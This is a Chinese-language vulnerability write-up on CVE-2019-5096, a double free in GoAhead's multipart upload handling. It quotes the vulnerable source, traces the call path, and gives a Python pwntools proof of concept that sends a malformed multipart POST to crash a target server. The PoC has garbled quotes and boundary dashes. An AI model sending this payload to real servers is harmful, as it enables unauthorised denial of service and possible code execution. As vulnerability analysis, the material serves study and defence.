# （CVE-2019-5096） GoAhead远程代码溢出漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2958](https://www.zhihuifly.com/t/topic/2958)

# （CVE-2019-5096） GoAhead 远程代码溢出漏洞

## 一、漏洞简介

GoAhead Web服务器最近被曝光在版本v5.0.1，v.4.1.1和v3.6.5中存在一个可利用的代码执行漏洞，漏洞存在http请求的multi-part/form-data字段处理中，若是发送畸形的HTTP请求，可导致GoAhead Web服务器在处理此请求期间触发double-free漏洞。 该畸形请求可以未经身份验证的GET或POST请求形式发送，并且请求的服务器上不需要存在web页面。

## 二、漏洞影响

v5.0.1，v.4.1.1和v3.6.5

## 三、复现过程

### 漏洞分析

漏洞曝光者给出了触发漏洞的源码：

```
/ src/upload.c /
66 static void freeUploadFile(WebsUpload *up)
67 {
68 if (up) {
69 if (up->filename) { // BUG: First UAF here
70 unlink(up->filename); // BUG: UAF/unlink - probably not a good idea
71 wfree(up->filename); // BUG: Double free here
72 }
73
74 wfree(up->clientFilename);
75 wfree(up->contentType);
76 wfree(up);
77 }
78 } 
```

经过笔者的分析发现，freeUploadFile（）函数会在/src/upload.c的websFreeUpload（）函数中调用，而websFreeUpload（）函数会在/src/http.c中调用，/src/http.c中termWebs（）函数会调用websFreeUpload（）函数，/src/http.c中reuseConn（）函数会调用termWebs（）函数，从中可以看出漏洞触发函数freeUploadFile（）的调用过程。

在函数freeUploadFile（）的调用过程中，查看源码可发现有两行如下代码：

```
/ src/upload.c /
255 freeUploadFile(wp->currentFile);
256 file = wp->currentFile = walloc(sizeof(WebsUpload)); 
```

在此处变量 wp->currentFile会被free一次，但是被free的变量wp->currentFile在代码：

```
/ src/upload.c /
371 hashEnter(wp->files, wp->uploadVar, valueSymbol(file), 0);
372 defineUploadVars(wp); 
```

在此处代码中把变量wp->currentFile加入了一个数组中，该数组中的变量在接下来的代码中会被free一次，free代码如下：

```
/ src/upload.c /
86 for (s = hashFirst(wp->files); s; s = hashNext(wp->files, s)) {
87 up = s->content.value.symbol;
88 freeUploadFile(up); 
```

变量wp->currentFile再次被free之后，导致了double-free漏洞触发，是fastbin double free，利用方法和思路已经很成熟。

### poc

> https://github.com/ianxtianxt/CVE-2019-5096-GoAhead-Web-Server-Dos-Exploit

```
from pwn import *
import time
import sys
r = remote(sys.argv[1],8080)
rn = b"\r\n"

payload=b’’

payload +=b"–siiit"+rn

payload +=b"Content-Disposition: form-data; name=“shit1”; filename=“shit.file”;"+rn

payload+= rn

payload+=b"HelloWorld!"+rn

payload +=b"–siiit"+rn

payload +=b"Content-Disposition: form-data;  name=“shit2”; filename=“shit2.file”"+rn

payload+= rn

payload+=b"FuckkWorld!"+rn

payload +=b"–siiit"+rn

data = b"POST / HTTP/1.1\r\nHost:HelloWorld:8080\r\n"

data +=b"content-type:multipart/form-data"+rn

data +=b"content-type:boundary=siiit"+rn

data +=b"content-length:"+str(len(payload)).encode()+rn

data +=b"cookie:"+b’a’*0x1+rn

data +=rn

data +=payload `r.send(data)

sleep(20)

try:

dat=r.recvn(1024)

print(dat)

r.close()

except:

r.close()` 
```